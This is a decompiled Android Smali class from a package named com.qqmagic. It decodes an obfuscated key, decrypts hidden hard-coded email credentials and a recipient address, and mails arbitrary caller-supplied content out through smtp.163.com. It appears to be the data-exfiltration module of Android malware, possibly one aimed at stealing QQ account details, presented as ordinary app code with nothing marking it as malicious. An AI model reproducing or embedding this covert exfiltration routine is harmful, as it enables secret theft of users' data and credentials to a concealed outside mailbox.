.class public Lcom/qqmagic/n;
.super Ljava/lang/Object;
.source "n.java"


# instance fields
.field dds:Lcom/qqmagic/d;

.field des:Lcom/qqmagic/d;

.field myemail:Ljava/lang/String;

.field mypssw:Ljava/lang/String;

.field p:Ljava/lang/String;

.field send1:Ljava/lang/String;

.field send2:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 74
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static ddd(Ljava/lang/String;I)Ljava/lang/String;
    .locals 4

    .prologue
    .line 65
    const-string v1, ""

    .line 66
    const-string v0, "/"

    invoke-virtual {p0, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 67
    const/4 v0, 0x1

    .line 68
    :goto_0
    array-length v3, v2

    if-lt v0, v3, :cond_0

    .line 73
    return-object v1

    .line 70
    :cond_0
    new-instance v3, Ljava/lang/StringBuffer;

    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    aget-object v3, v2, v0

    invoke-static {v3, p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v3

    int-to-char v3, v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    .line 71
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method


# virtual methods
.method public conect(Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 14
    new-instance v0, Lcom/qqmagic/d;

    const-string v1, "/2c/30/2h/58/5c/59/2c/2g/2e/2h/32/2h/2g/2e/31/2d/2c/2g/2h/2d/30/57/59/58/30/2g/33/2h/33/2e/5b/2d"

    const/16 v2, 0x12

    invoke-static {v1, v2}, Lcom/qqmagic/n;->ddd(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/qqmagic/d;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/qqmagic/n;->dds:Lcom/qqmagic/d;

    .line 17
    :try_start_0
    iget-object v0, p0, Lcom/qqmagic/n;->dds:Lcom/qqmagic/d;

    const-string v1, "b64765710a1de8e7f5a2aa12f7fbe74c"

    invoke-virtual {v0, v1}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/n;->p:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 21
    :goto_0
    new-instance v0, Lcom/qqmagic/d;

    iget-object v1, p0, Lcom/qqmagic/n;->p:Ljava/lang/String;

    invoke-direct {v0, v1}, Lcom/qqmagic/d;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/qqmagic/n;->des:Lcom/qqmagic/d;

    .line 25
    :try_start_1
    iget-object v0, p0, Lcom/qqmagic/n;->des:Lcom/qqmagic/d;

    const-string v1, "ec2885bbb2247ee6bd375e1895a96c10d18ced693f95344d"

    invoke-virtual {v0, v1}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/n;->myemail:Ljava/lang/String;

    .line 27
    iget-object v0, p0, Lcom/qqmagic/n;->des:Lcom/qqmagic/d;

    const-string v1, "a407d5de1fe8e095e950fc9d29f4ab08"

    invoke-virtual {v0, v1}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/n;->mypssw:Ljava/lang/String;

    .line 30
    iget-object v0, p0, Lcom/qqmagic/n;->des:Lcom/qqmagic/d;

    const-string v1, "ea2ef4ef7e3a464869cfdc98741b9b63d18ced693f95344d"

    invoke-virtual {v0, v1}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/n;->send1:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 34
    :goto_1
    new-instance v0, Lcom/qqmagic/p;

    invoke-direct {v0}, Lcom/qqmagic/p;-><init>()V

    .line 35
    const-string v1, "smtp.163.com"

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setMailServerHost(Ljava/lang/String;)V

    .line 36
    const-string v1, "25"

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setMailServerPort(Ljava/lang/String;)V

    .line 37
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setValidate(Z)V

    .line 38
    iget-object v1, p0, Lcom/qqmagic/n;->myemail:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setUserName(Ljava/lang/String;)V

    .line 39
    iget-object v1, p0, Lcom/qqmagic/n;->mypssw:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setPassword(Ljava/lang/String;)V

    .line 40
    iget-object v1, p0, Lcom/qqmagic/n;->myemail:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setFromAddress(Ljava/lang/String;)V

    .line 41
    iget-object v1, p0, Lcom/qqmagic/n;->send1:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/qqmagic/p;->setToAddress(Ljava/lang/String;)V

    .line 42
    invoke-virtual {v0, p1}, Lcom/qqmagic/p;->setSubject(Ljava/lang/String;)V

    .line 43
    invoke-virtual {v0, p2}, Lcom/qqmagic/p;->setContent(Ljava/lang/String;)V

    .line 48
    new-instance v1, Lcom/qqmagic/l;

    invoke-direct {v1}, Lcom/qqmagic/l;-><init>()V

    .line 49
    invoke-virtual {v1, v0}, Lcom/qqmagic/l;->sendTextMail(Lcom/qqmagic/p;)Z

    return-void

    .line 30
    :catch_0
    move-exception v0

    goto :goto_1

    .line 17
    :catch_1
    move-exception v0

    goto :goto_0
.end method
